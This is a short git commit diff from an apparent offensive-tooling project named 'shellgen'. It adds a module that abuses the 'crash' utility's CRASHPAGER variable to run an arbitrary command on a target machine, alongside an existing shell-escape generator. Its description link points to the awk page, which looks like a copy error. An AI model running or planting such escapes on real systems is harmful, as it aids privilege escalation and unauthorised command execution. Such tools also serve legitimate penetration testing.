eac95d60b8849724739e5a943c47eb12262ae2ae
Nong Hoang Tu <dmknght@parrotsec.org>
2021-10-23 01:32:56 +0700

    Add class Command to crash

--- shellgen/modules/linux/crash.py
+++ shellgen/modules/linux/crash.py
@@ -17,3 +17,20 @@ class Shell(plugin.BaseShell):
 
     def make_shell(self):
         self.shell = f"crash -h\n!\"{self.args.shell}"
+
+
+class Command(plugin.BaseShell):
+    def __init__(self):
+        super().__init__()
+        self.shell_type = 3
+        self.is_interactive = False
+        self.add_args(
+            "--command",
+            default="/usr/bin/id",
+            help="Command to run on target machine"
+        )
+        self.opts.description = "https://gtfobins.github.io/gtfobins/awk/"
+        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
+
+    def make_shell(self):
+        self.shell = f"COMMAND='{self.args.command}' && CRASHPAGER=\"$COMMAND\" crash -h"
